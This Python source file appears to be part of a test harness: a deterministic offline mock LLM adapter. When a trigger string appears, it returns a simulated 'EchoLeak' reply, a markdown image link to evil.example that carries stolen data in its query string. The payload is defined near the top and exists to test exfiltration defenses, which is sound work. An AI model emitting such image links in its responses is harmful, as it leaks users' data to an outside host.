"""Deterministic offline Mock LLM adapter for air-gapped testing and demos."""

from __future__ import annotations

from collections.abc import AsyncIterator
from typing import Any

from pokrov.core.contracts import (
    ProviderType,
    UpstreamRequest,
    UpstreamResponse,
)

ECHOLEAK_TRIGGER = "__TRIGGER_ECHOLEAK__"
ECHOLEAK_PAYLOAD = "Summary: ![leak](https://evil.example/steal?data=secret123)"


def extract_block_text(content: Any) -> str:
    """Extract plain text from string or structured OpenAI/Anthropic content blocks."""
    if isinstance(content, str):
        return content
    if isinstance(content, list):
        parts: list[str] = []
        for item in content:
            if isinstance(item, str):
                if item:
                    parts.append(item)
            elif isinstance(item, dict):
                text_val = item.get("text")
                if isinstance(text_val, str) and text_val:
                    parts.append(text_val)
                elif "content" in item:
                    nested = extract_block_text(item.get("content"))
                    if nested:
                        parts.append(nested)
        return "\n".join(parts)
    return ""


def _extract_last_input_text(request: UpstreamRequest) -> str:
    """Return text from the last ``user`` or ``tool`` message (with fallbacks)."""
    for msg in reversed(request.messages):
        role = msg.get("role")
        if role in {"user", "tool"}:
            return extract_block_text(msg.get("content", ""))

    if request.messages:
        return extract_block_text(request.messages[-1].get("content", ""))

    return request.system or ""


def _contains_echoleak_trigger(request: UpstreamRequest) -> bool:
    """Return True if any input message or system prompt triggers the EchoLeak simulation."""
    if request.system and ECHOLEAK_TRIGGER in request.system:
        return True
    for msg in request.messages:
        if ECHOLEAK_TRIGGER in extract_block_text(msg.get("content", "")):
            return True
    return False


class MockLLMAdapter:
    """Offline deterministic ``UpstreamAdapter`` preserving ``<PKR:...>`` placeholders."""

    def __init__(
        self,
        name: str = "mock-local",
        model: str = "pokrov-mock-llm",
        chunk_size: int = 4,
    ) -> None:
        if chunk_size < 1:
            raise ValueError(f"chunk_size must be >= 1, got {chunk_size}")
        self._name = name
        self._model = model
        self._chunk_size = chunk_size

    @property
    def name(self) -> str:
        """Configured upstream identifier."""
        return self._name

    @property
    def provider(self) -> ProviderType:
        """Provider type (always ``ProviderType.MOCK``)."""
        return ProviderType.MOCK

    @property
    def is_local(self) -> bool:
        """Whether this upstream stays inside the local/trusted contour."""
        return True

    @property
    def model(self) -> str:
        """Default mock model identifier."""
        return self._model

    def _build_reply(self, request: UpstreamRequest) -> str:
        """Build deterministic offline response text."""
        if _contains_echoleak_trigger(request):
            return ECHOLEAK_PAYLOAD
        last_text = _extract_last_input_text(request)
        return f"Принято к обработке: {last_text}"

    async def complete(self, request: UpstreamRequest) -> UpstreamResponse:
        """Return a deterministic non-streaming completion response."""
        reply = self._build_reply(request)
        last_text = _extract_last_input_text(request)
        effective_model = request.model or self._model
        prompt_tokens = max(1, len(last_text) // 4) if last_text else 0
        completion_tokens = max(1, len(reply) // 4) if reply else 0

        raw_payload: dict[str, Any] = {
            "id": "chatcmpl-pokrov-mock",
            "object": "chat.completion",
            "model": effective_model,
            "choices": [
                {
                    "index": 0,
                    "message": {"role": "assistant", "content": reply},
                    "finish_reason": "stop",
                }
            ],
            "usage": {
                "prompt_tokens": prompt_tokens,
                "completion_tokens": completion_tokens,
                "total_tokens": prompt_tokens + completion_tokens,
            },
        }

        return UpstreamResponse(
            provider=ProviderType.MOCK,
            model=effective_model,
            upstream_name=self._name,
            content=reply,
            raw_payload=raw_payload,
            prompt_tokens=prompt_tokens,
            completion_tokens=completion_tokens,
            status_code=200,
        )

    async def stream_text(self, request: UpstreamRequest) -> AsyncIterator[str]:
        """Yield deterministic reply text split into ``chunk_size`` fragments."""
        reply = self._build_reply(request)
        for idx in range(0, len(reply), self._chunk_size):
            yield reply[idx : idx + self._chunk_size]

    async def aclose(self) -> None:
        """No-op cleanup method matching HTTP upstream adapters."""
        return None


__all__ = ["ECHOLEAK_PAYLOAD", "ECHOLEAK_TRIGGER", "MockLLMAdapter", "extract_block_text"]
